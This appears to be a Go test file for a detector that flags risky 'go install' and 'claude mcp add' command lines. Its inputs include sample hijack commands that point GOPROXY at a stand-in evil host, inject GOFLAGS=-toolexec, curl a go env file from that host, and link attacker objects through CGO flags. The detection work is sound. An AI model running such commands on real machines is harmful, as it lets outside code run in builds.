package installread

import (
	"slices"
	"strings"
	"testing"
)

// ECO-1 Go, round 4 (re-review of a9d7b6b3, an internal review note; its reader probes
// adopted as assertions).

func TestGoR4Holds(t *testing.T) {
	for line, code := range map[string]string{
		// P2-1: go env -u takes the name as written; go refuses a lower-case one and keeps the value
		"go env -w GOPROXY=https://zz-evil.example; go env -u goproxy; go install example.com/zz@v1.0.0":         "custom_registry",
		"go env -w GOFLAGS=-toolexec=./w; go env -u goflags; go run example.com/zz@v1.0.0":                       "code_from_environment",
		"go env -w GOPROXY=https://zz-evil.example; go env -u goproxy GOPROXY; go install example.com/zz@v1.0.0": "custom_registry",
		// P2-2: the MCP add env — variadic -e, an attached -eK=V, a pair the line does not show
		"npx -y @anthropic-ai/claude-code mcp add zz -e GOCACHE=/go/x GOPROXY=https://zz-evil.example -- go run example.com/zz@v1.0.0": "custom_registry",
		"npx -y @anthropic-ai/claude-code mcp add zz --env GOCACHE=/go/x GOFLAGS=-toolexec=./w -- go run example.com/zz@v1.0.0":        "code_from_environment",
		"npx -y @anthropic-ai/claude-code mcp add zz -eGOPROXY=https://zz-evil.example -- go run example.com/zz@v1.0.0":                "custom_registry",
		`npx -y @anthropic-ai/claude-code mcp add zz -e "$E" -- go run example.com/zz@v1.0.0`:                                          "variable_argument",
		// P3-2: writes of the go env file the reader cannot follow, on a line that runs go
		"F=~/.config/go/env; echo GOFLAGS=-toolexec=./w >> $F; go run example.com/zz@v1.0.0":                           "custom_registry",
		`echo GOFLAGS=-toolexec=./w >> "$(go env GOENV)" && go run example.com/zz@v1.0.0`:                              "unread_env_write",
		"curl -so ~/.config/go/env https://zz-evil.example/env && go install example.com/zz@v1.0.0":                    "custom_registry",
		"cp zz.env ~/.config/go/ && go install example.com/zz@v1.0.0":                                                  "unread_env_write",
		"cp -r zzcfg/. ~/.config/go && go install example.com/zz@v1.0.0":                                               "unread_env_write",
		"rsync -a zzcfg/ ~/.config/go/ && go install example.com/zz@v1.0.0":                                            "unread_env_write",
		`python3 -c "open('/root/.config/go/env','w').write('GOFLAGS=-toolexec=./w')" && go run example.com/zz@v1.0.0`: "unread_env_write",
		// P3-4: response files, gcc's long forms, object files, gcc's own variables
		"CGO_CFLAGS=@./flags go install example.com/zz@v1.0.0":                                                      "code_from_environment",
		"CGO_CFLAGS='--include=./evil.h' go install example.com/zz@v1.0.0":                                          "code_from_environment",
		"CGO_CFLAGS='--include ./evil.h' go install example.com/zz@v1.0.0":                                          "code_from_environment",
		"CGO_CFLAGS='--include-directory=./evil' go install example.com/zz@v1.0.0":                                  "code_from_environment",
		"CGO_LDFLAGS='--library-directory=./evil' go install example.com/zz@v1.0.0":                                 "code_from_environment",
		"CC='gcc --prefix=./evil' go install example.com/zz@v1.0.0":                                                 "code_from_environment",
		"CGO_LDFLAGS='-Wl,--wrap=main ./evil.o' go install example.com/zz@v1.0.0":                                   "code_from_environment",
		"CGO_LDFLAGS='./evil.o' go install example.com/zz@v1.0.0":                                                   "code_from_environment",
		"CGO_LDFLAGS='libevil.a' go install example.com/zz@v1.0.0":                                                  "code_from_environment",
		"COMPILER_PATH=$X go install example.com/zz@v1.0.0":                                                         "code_from_environment",
		"C_INCLUDE_PATH=$INC go install example.com/zz@v1.0.0":                                                      "code_from_environment",
		"CGO_CFLAGS=@flags go install example.com/zz@v1.0.0":                                                        "code_from_environment",
		"CGO_LDFLAGS='./link.ld' go install example.com/zz@v1.0.0":                                                  "code_from_environment",
		"npx -y @anthropic-ai/claude-code mcp add zz -e $K=https://zz-evil.example -- go run example.com/zz@v1.0.0": "variable_argument",
		"COMPILER_PATH=./bin go install example.com/zz@v1.0.0":                                                      "code_from_environment",
		"GCC_EXEC_PREFIX=/tmp/x/ go install example.com/zz@v1.0.0":                                                  "code_from_environment",
		"CPATH=./inc go install example.com/zz@v1.0.0":                                                              "code_from_environment",
		"C_INCLUDE_PATH=./inc go install example.com/zz@v1.0.0":                                                     "code_from_environment",
		"LIBRARY_PATH=/usr/lib:./lib go install example.com/zz@v1.0.0":                                              "code_from_environment",
		"PKG_CONFIG_PATH=./pc go install example.com/zz@v1.0.0":                                                     "code_from_environment",
		// P3-3: the rule that remains — relative, ./, $PWD, .., temporary, a variable other than $HOME
		"GOMODCACHE=$PWD/c go install example.com/zz@v1.0.0":         "code_from_environment",
		"GOMODCACHE=${PWD}/go go install example.com/zz@v1.0.0":      "code_from_environment",
		"GOMODCACHE=go/pkg/mod go install example.com/zz@v1.0.0":     "code_from_environment",
		"GOROOT=/home/u/proj/../go go install example.com/zz@v1.0.0": "code_from_environment",
	} {
		_, codes := codesOf(line)
		if !slices.Contains(codes, code) {
			t.Errorf("ParseLine(%q): codes %q; want %s", line, codes, code)
		}
	}
}

// P3-3/P3-8: an absolute folder outside the temporary ones is not judged by its name any more: the CI-style lines the
// review measured, and the README and constructed corpora, read clean.
func TestGoR4AbsoluteFoldersClean(t *testing.T) {
	for _, line := range []string{
		"GOMODCACHE=/cache/mod go install github.com/zz/t@latest",
		"GOCACHE=/cache/build go install github.com/zz/t@latest",
		"GOPATH=/workspace go install github.com/zz/t@latest",
		"GOPATH=$HOME go install github.com/zz/t@latest",
		"GOMODCACHE=/builds/proj/.go/pkg/mod go install github.com/zz/t@latest",
		"GOMODCACHE=/var/cache/gomod go install github.com/zz/t@latest",
		"GOMODCACHE=/home/u/proj/.cache go install github.com/zz/t@latest",
		"GOMODCACHE=~ go install github.com/zz/t@latest",
		"CC=/usr/bin/clang CGO_CFLAGS='-I/opt/homebrew/include' CGO_LDFLAGS='-L/opt/homebrew/lib' go install github.com/zz/t@latest",
		"CGO_LDFLAGS='-fuse-ld=lld' go install github.com/zz/t@latest",
		"CGO_LDFLAGS='/usr/lib/x86_64-linux-gnu/libz.a -lm' go install github.com/zz/t@latest",
		"CPATH=/usr/local/include LIBRARY_PATH=/usr/local/lib go install github.com/zz/t@latest",
		"claude mcp add github -e GITHUB_TOKEN=x -- go run github.com/github/github-mcp-server/cmd/github-mcp-server@latest stdio",
		"curl -o x.tgz https://example.com/x.tgz && go install github.com/zz/t@latest",
		"make && go install github.com/zz/t@latest",
	} {
		_, codes := codesOf(line)
		if len(codes) > 0 {
			t.Errorf("ParseLine(%q): codes %q", line, codes)
		}
	}
}

// P3-1, P2-2: a written go env file and an unseen MCP add pair make the target go-private: (no reads on the server).
func TestGoR4Private(t *testing.T) {
	for _, line := range []string{
		"echo GOPRIVATE=corp.example >> ~/.config/go/env && go install corp.example/zz@v1.0.0",
		"F=~/.config/go/env; echo GOPRIVATE=corp.example >> $F; go install corp.example/zz@v1.0.0",
		"go env -w GOPRIVATE=corp.example; go env -u goprivate; go install corp.example/zz@v1.0.0",
		`npx -y @anthropic-ai/claude-code mcp add zz -e "$E" -- go run corp.example/zz@v1.0.0`,
		"npx -y @anthropic-ai/claude-code mcp add zz -e GOCACHE=/go/x GOPRIVATE=corp.example -- go run corp.example/zz@v1.0.0",
		"npx -y @anthropic-ai/claude-code mcp add zz -eGOPRIVATE=corp.example -- go run corp.example/zz@v1.0.0",
	} {
		targets, _, _, _ := ParseLine(line)
		if !slices.Contains(targets, "go-private:corp.example/zz@v1.0.0") {
			t.Errorf("ParseLine(%q): targets %q", line, targets)
		}
	}
	// claude's own line names the nested launch with the pairs before it
	for line, want := range map[string]string{
		"claude mcp add zz -e GOCACHE=/go/x GOPRIVATE=corp.example -- go run corp.example/zz@v1.0.0": "env GOCACHE=/go/x GOPRIVATE=corp.example go run",
		"claude mcp add zz -eGOPRIVATE=corp.example -- go run corp.example/zz@v1.0.0":                "env GOPRIVATE=corp.example go run",
		`claude mcp add zz -e "$E" -- go run corp.example/zz@v1.0.0`:                                 "env '$E=' go run",
	} {
		targets, _, _, _ := ParseLine(line)
		if len(targets) != 1 || !strings.HasPrefix(targets[0], want) {
			t.Errorf("ParseLine(%q): targets %q; want %q…", line, targets, want)
		}
	}
}

// The second reader reads the same pairs through the one parser (extra.go mcpAddEnv).
func TestGoR4OneMCPAddParser(t *testing.T) {
	for in, want := range map[string][]string{
		"-e A=1 B=2 zz --":        {"A=1", "B=2"},
		"zz -eA=1 --env C=3 --":   {"A=1", "C=3"},
		"zz --env=A=1 -e=B=2 --":  {"A=1", "B=2"},
		`zz -e $E -- go run x@v1`: {"$E"},
		"zz -e -- go run x@v1":    nil,
	} {
		if got := MCPAddEnvWords(strings.Fields(in)); !slices.Equal(got, want) {
			t.Errorf("MCPAddEnvWords(%q) = %q; want %q", in, got, want)
		}
	}
}
